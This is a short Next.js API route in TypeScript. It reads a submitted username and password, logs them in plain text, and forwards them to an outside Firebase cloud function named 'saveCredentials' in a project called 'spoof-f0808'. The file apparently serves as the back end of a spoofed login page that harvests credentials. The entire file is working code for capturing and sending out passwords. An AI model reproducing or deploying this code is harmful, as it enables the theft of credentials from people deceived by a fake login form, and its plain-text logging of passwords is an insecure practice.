// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'

const endpoint = "https://us-central1-spoof-f0808.cloudfunctions.net/saveCredentials";
type Data = {
  message?: string;
  status?: string;
  process?: string;
  uid?: string;
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  const {userName, password} = req.body;
  console.log({userName, password})
  const data: Data = await fetch(endpoint, {
    method: "POST",
    headers: {
      "content-type": "application/json",
    },
    body: JSON.stringify({data:{
      userName: userName,
      password: password
    }})
  }).then(x => x.json());

  res.status(200).json(data);
  res.end();
}
